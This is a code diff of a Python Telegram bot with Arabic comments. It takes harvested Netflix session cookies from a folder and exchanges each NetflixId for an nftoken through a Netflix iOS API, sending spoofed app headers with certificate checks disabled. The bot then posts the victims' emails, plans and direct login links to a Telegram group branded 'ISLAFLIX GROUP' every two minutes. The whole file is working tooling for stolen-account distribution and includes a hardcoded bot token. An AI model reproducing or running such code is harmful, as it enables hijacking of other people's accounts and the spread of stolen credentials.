@@ -2,35 +2,112 @@ import os
 import time
 import re
 import html
-import random
 import requests
+from urllib3.exceptions import InsecureRequestWarning
 
 # ================= CONFIGURATION =================
 TOKEN = "8761634086:AAGEenb8YLL0IP-ReDTG8upj8VN_ZIT9hEs"
 CHAT_ID = "-1004447097011"
 COOKIES_DIR = "./cookies"
-INTERVAL_SECONDS = 2 * 60  # 2 minutes interval between each send
+INTERVAL_SECONDS = 2 * 60  # دقيقتان بين كل إرسال
+API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 # =================================================
 
-def is_cookie_strong_valid(file_path):
-    """فحص قوي وصارم للتأكد أن الكوكيز شغالة وغير تالفة"""
-    try:
-        if not os.path.exists(file_path) or os.path.getsize(file_path) < 50:
-            return False
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+BASE_HEADERS = {
+    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
+    "x-netflix.request.attempt": "1",
+    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
+    "x-netflix.context.app-version": "15.48.1",
+    "x-netflix.argo.translated": "true",
+    "x-netflix.context.form-factor": "phone",
+    "x-netflix.context.sdk-version": "2012.4",
+    "x-netflix.client.appversion": "15.48.1",
+    "x-netflix.context.max-device-width": "375",
+    "x-netflix.context.ab-tests": "",
+    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
+    "x-netflix.client.type": "argo",
+    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+    "x-netflix.context.locales": "en-US",
+    "x-netflix.argo.abtests": "",
+    "x-netflix.context.os-version": "15.8.5",
+    "x-netflix.request.client.context": '{"appState":"foreground"}',
+    "x-netflix.context.ui-flavor": "argo",
+    "x-netflix.argo.nfnsm": "9",
+    "x-netflix.context.pixel-density": "2.0",
+    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
+}
+
+QUERY_PARAMS = {
+    "appVersion": "15.48.1",
+    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
+    "device_type": "NFAPPL-02-",
+    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+    "idiom": "phone",
+    "iosVersion": "15.8.5",
+    "isTablet": "false",
+    "languages": "en-US",
+    "locale": "en-US",
+    "maxDeviceWidth": "375",
+    "model": "saget",
+    "modelType": "IPHONE8-1",
+    "odpAware": "true",
+    "path": '["account","token","default"]',
+    "pathFormat": "graph",
+    "pixelDensity": "2.0",
+    "progressive": "false",
+    "responseFormat": "json",
+}
+
+def extract_cookie_dict(text):
+    cookie_dict = {}
+    for line in text.splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        parts = line.split("\t")
+        if len(parts) >= 7:
+            cookie_dict[parts[5]] = parts[6]
+
+    if "NetflixId" not in cookie_dict:
+        match = re.search(r'NetflixId[=\t\s]+([^\s;]+)', text)
+        if match:
+            cookie_dict["NetflixId"] = match.group(1)
             
-        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
+    return cookie_dict
 
-        has_netflix_id = bool(re.search(r'NetflixId\t|\s+NetflixId\s+', content, re.IGNORECASE))
-        has_token = bool(re.search(r'nftoken|token|Secure-FlixId', content, re.IGNORECASE))
-        is_expired = bool(re.search(r'expired|invalid|error|forbidden', content, re.IGNORECASE))
+def fetch_nftoken(cookie_dict):
+    netflix_id = cookie_dict.get("NetflixId")
+    if not netflix_id:
+        return None
 
-        if not (has_netflix_id or has_token) or is_expired:
-            return False
+    headers = dict(BASE_HEADERS)
+    headers["Cookie"] = f"NetflixId={netflix_id}"
 
-        return True
+    try:
+        response = requests.get(
+            API_URL,
+            params=QUERY_PARAMS,
+            headers=headers,
+            timeout=7,
+            verify=False,
+        )
+        if response.status_code == 200:
+            data = response.json()
+            token_data = (
+                (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
+                or {}
+            )
+            token = token_data.get("token")
+            if token:
+                return token
     except Exception:
-        return False
+        pass
+    return None
 
 def parse_cookies_file(file_path):
     with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
@@ -73,28 +150,40 @@ def parse_cookies_file(file_path):
     plan_match = re.search(r'Plan:\s*(.+)', content, re.IGNORECASE)
     plan_type = plan_match.group(1).strip() if plan_match else "Ultra HD / Premium"
 
-    # Extract Token / NetflixId
-    netflix_id_match = re.search(r'NetflixId\tTRUE\t/\tTRUE\t\d+\tNetflixId\t([^\s]+)', content)
-    if not netflix_id_match:
-        netflix_id_match = re.search(r'NetflixId\s+([^\s]+)', content)
+    # استخراج وتوليد التوكن الحقيقي
+    cookie_dict = extract_cookie_dict(content)
+    token_val = fetch_nftoken(cookie_dict)
     
-    if netflix_id_match:
-        token_val = netflix_id_match.group(1)
-    else:
-        token_match = re.search(r'Token:\s*([^\n]+)', content)
-        if token_match:
-            token_val = token_match.group(1).strip()
-        else:
-            token_val = ""
+    if not token_val:
+        #Fallback لو الـ API ما ردّش، ياخذ NetflixId العادي
+        token_val = cookie_dict.get("NetflixId", "")
 
     token_clean = token_val.replace(" ", "+")
 
-    pc_link = f"https://netflix.com/?nftoken={token_clean}"
+    pc_link = f"https://www.netflix.com/login?nftoken={token_clean}"
     android_link = f"https://netflix.com/unsupported?nftoken={token_clean}"
-    ios_link = f"https://netflix.com/?nftoken={token_clean}"
+    ios_link = f"https://netflix.com/unsupported?nftoken={token_clean}"
     tv_link = f"https://netflix.com/tv2?nftoken={token_clean}"
 
-    return email_full, profiles, country_display, plan_type, pc_link, android_link, ios_link, tv_link
+    msg = f"""✂️ ════════════════════════════════════ ✂️
+🎬 **NETFLIX VIP ACCOUNT** 🌟
+🔥 **حسابات متوفرة | Available Accounts**
+
+✅ **Status:** Ready For Instant Use
+📧 **Email:** `{email_full}`
+👥 **Profiles:** {profiles}
+🌍 **Country:** {country_display}
+💎 **Plan:** {plan_type}
+
+🔗 **Direct Login Links:**
+[💻 PC]({pc_link}) | [🤖 Android]({android_link})
+[🍏 iOS]({ios_link}) | [📺 TV]({tv_link})
+
+💬 **تفاعل للمزيد | React for more**
+⚡ *ISLAFLIX GROUP*
+✂️ ════════════════════════════════════ ✂️"""
+
+    return msg
 
 def send_to_telegram(text):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
@@ -109,6 +198,7 @@ def send_to_telegram(text):
         if response.status_code == 200:
             data = response.json()
             message_id = data.get("result", {}).get("message_id")
+            print("[+] Account sent successfully!")
             if message_id:
                 add_reaction(message_id)
             return True
@@ -132,88 +222,36 @@ def add_reaction(message_id):
         pass
 
 def main():
-    print("[*] ISLAFLIX Random Secure Bot started.")
+    print("[*] Automated Cookie Distributor started.")
     if not os.path.exists(COOKIES_DIR):
         os.makedirs(COOKIES_DIR)
-
-    empty_alert_sent = False
 
     while True:
         files = os.listdir(COOKIES_DIR)
         txt_files = [f for f in files if f.endswith('.txt')]
 
         if not txt_files:
-            if not empty_alert_sent:
-                alert_msg = """⚠️ ════════════════════════════════════ ⚠️
-🎬 **ISLAFLIX SYSTEM** 🌟
-⏳ **نفدت الحسابات الحالية مؤقتاً!**
-🔄 *انتظرونا قريباً بدفعة حسابات جديدة ومفعلة.*
-
-💬 **Stay tuned for the next drop!**
-⚡ *ISLAFLIX GROUP*
-⚠️ ════════════════════════════════════ ⚠️"""
-                send_to_telegram(alert_msg)
-                print("[i] No cookie files left. Alert sent to group.")
-                empty_alert_sent = True
-
+            print("[i] No cookie files left in the folder. Waiting 2 minutes to check again...")
             time.sleep(INTERVAL_SECONDS)
             continue
 
-        empty_alert_sent = False
-
-        # اختيار ملف عشوائي من المجلد
-        file_name = random.choice(txt_files)
+        file_name = txt_files[0]
         file_path = os.path.join(COOKIES_DIR, file_name)
-        
-        # فحص الملف: لو خربان وتالف نحذفه فوراً
-        if not is_cookie_strong_valid(file_path):
-            print(f"[-] Corrupted or dead cookie detected: {file_name}. Deleting...")
-            try:
-                os.remove(file_path)
-            except:
-                pass
-            continue
-
-        total_accounts = len(txt_files)
-        print(f"\n[*] Processing random verified cookie: {file_name} ({total_accounts} available)")
+        print(f"\n[*] Processing file: {file_name}")
 
         try:
-            email_full, profiles, country_display, plan_type, pc_link, android_link, ios_link, tv_link = parse_cookies_file(file_path)
-
-            msg = f"""✂️ ════════════════════════════════════ ✂️
-🎬 **NETFLIX VIP ACCOUNT** 🌟
-🔥 **حسابات متوفرة | Available Accounts:** `{total_accounts}` متبقية
-
-✅ **Status:** Verified & Active
-📧 **Email:** `{email_full}`
-👥 **Profiles:** {profiles}
-🌍 **Country:** {country_display}
-💎 **Plan:** {plan_type}
-
-🔗 **Direct Login Links:**
-[💻 PC]({pc_link}) | [🤖 Android]({android_link})
-[🍏 iOS]({ios_link}) | [📺 TV]({tv_link})
-
-💬 **تفاعل للمزيد | React for more**
-⚡ *ISLAFLIX GROUP*
-✂️ ════════════════════════════════════ ✂️"""
-
-            success = send_to_telegram(msg)
+            formatted_message = parse_cookies_file(file_path)
+            success = send_to_telegram(formatted_message)
             
             if success:
-                # إذا أرسل بنجاح، نحذفه عشان ما يتكرر إرسال نفس الحساب المستهلك (أو تقدر تشيل سطر الحذف لو تبيه ينشر نفس الملف مرات متعددة)
                 os.remove(file_path)
-                print(f"[+] Random file sent successfully and removed: {file_name}")
+                print(f"[+] File successfully sent and deleted: {file_name}")
             else:
-                print("[-] Failed to send message, will retry in next cycle.")
+                print("[-] Failed to send message, will retry this file in the next cycle.")
         except Exception as e:
             print(f"[-] Error processing file {file_name}: {e}")
-            try:
-                os.remove(file_path)
-            except:
-                pass
 
-        print(f"[*] Waiting 2 minutes before the next random drop...")
+        print(f"[*] Waiting 2 minutes before sending the next cookie...")
         time.sleep(INTERVAL_SECONDS)
 
 if __name__ == "__main__":
